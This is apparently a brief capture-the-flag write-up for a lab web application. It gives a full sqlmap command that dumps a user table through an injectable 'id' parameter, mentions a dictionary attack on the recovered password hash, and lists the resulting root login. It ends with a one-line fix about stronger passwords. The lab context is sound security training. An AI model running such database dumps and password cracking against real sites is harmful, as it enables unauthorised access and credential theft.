# 11_Brute_force

We can brute force login by allowing / using simple, common passwords

## Method & How to exploit

sqlmap -u "http://192.168.1.75/index.php?page=member&id=5&Submit=Submit#" --dump -D Member_Brute_Force -T db_default
and use dictionary attack can use custom dictionary file if you want and decrypt the countersign of getTheFlag

Go to ?page=signin  
username: root
password: shadow

## Solution
When registering users should be only be allowed to make more complicated alphnumeric password